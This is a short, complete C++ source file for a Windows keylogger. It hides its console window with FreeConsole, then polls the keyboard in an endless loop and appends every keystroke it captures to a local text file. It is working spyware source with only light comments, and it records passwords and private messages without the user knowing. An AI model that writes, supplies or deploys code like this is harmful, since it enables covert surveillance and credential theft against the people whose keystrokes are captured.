#include <iostream>
#include <fstream>
#include <windows.h>     //to interact with operating system (Getasyn...)
#include <winuser.h>     //can write words not numbers

using namespace std;

class Logger {
public:
    virtual void log(const string& key) = 0;    //to save keys in file
    virtual ~Logger() {}
};

class FileLogger : public Logger {
private:
    ofstream logfile;
public:
    FileLogger(const string& filename) {
        logfile.open(filename, ios::app);  // Open in append mode
    }

    ~FileLogger() {
        logfile.close();  // Ensure file is closed when done
    }

    void log(const string& key) {
        logfile << key;
        logfile.flush();  // Force-write data to file immediately
    }
};

class KeyLogger {
private:
    string mapKey(int key) {                //include<windows.h>
        switch (key) {                      // #define VK_BACK 0x08  ...                                                                                 
            case VK_BACK: 
                return "[backspace]"; 
            case VK_RETURN: 
                return "[enter]";
            case VK_SHIFT: 
                return "[shift]";           //different value than lshift and rshift
            case VK_CONTROL: 
                return "[ctrl]";
            case VK_TAB: 
                return "[tab]";
            case VK_SPACE: 
                return "[space] ";
            case VK_MENU: 
                return "[alt]";
            default:
                if (key >= 32 && key <= 126)
                {
                    char c = static_cast<char>(key);
                    return string() + c;
                }
                return "";
        }
    }
    Logger* logger;
public:
    KeyLogger(Logger* logger) {
        this->logger = logger;                   //for runtime polymorphism
    }

    void start() {
        while (true) {
            for (int key = 0; key <= 254; key++) {                          
                if (GetAsyncKeyState(key) & 0x1) {           //if pressed for long or short time
                    string k = mapKey(key);
                    if (!k.empty())
                        logger->log(k); 
                }
            }
        }
    }
};

int main() {
    FreeConsole();    //to hide console
    FileLogger fileLogger("testing.txt");  // File will be named
    KeyLogger keylogger(&fileLogger);
    keylogger.start();
    return 0;
}
